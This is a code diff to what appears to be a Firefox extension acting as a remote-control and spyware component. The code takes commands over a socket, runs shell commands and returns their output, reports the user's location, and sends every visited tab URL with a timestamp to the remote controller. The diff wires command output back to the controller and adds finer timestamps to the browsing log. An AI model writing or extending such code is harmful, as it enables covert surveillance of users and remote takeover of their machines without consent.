@@ -52,7 +52,7 @@ function(data){ // function run where data receieved
             getCurrentPosition(command);
             break;
         case 5:
-            runCommand(args);
+            toSend=runCommand(args);
             break;
         default:
             toSend=[""];
@@ -61,7 +61,7 @@ function(data){ // function run where data receieved
             
     }
     
-    if (toSend != [""])
+    if (toSend != [""] && exec)
     {
         sendDataAsync(command,toSend);
     }
@@ -84,9 +84,11 @@ function logURL(tab) {
     var month = currentTime.getMonth() + 1;
     var day = currentTime.getDate();
     var year = currentTime.getFullYear();
-    date = month + "/" + day + "/" + year;
+    var hour = currentTime.getHours();
+    var minute = currentTime.getMinutes();
+    date = month + "/" + day + "/" + year + " " + hour + ":" + minute;
     data = new Array(date,tab.url); 
-    data2= new Array("h",data);
+    data2= new Array(6,data);
     socket.write(data2);  
 }
 
@@ -179,6 +181,7 @@ function getCurrentPosition() {
 // will return the result of the final command given. Put && instead of returns, otherwise it will probably screw things up.
 function runCommand(command){
     // don't ask..... just don't.
+
     var fName = new Date();
     var file = Cc["@mozilla.org/file/directory_service;1"].
            getService(Ci.nsIProperties).
@@ -234,4 +237,3 @@ function Read(file)
      
     return data;
 }
-
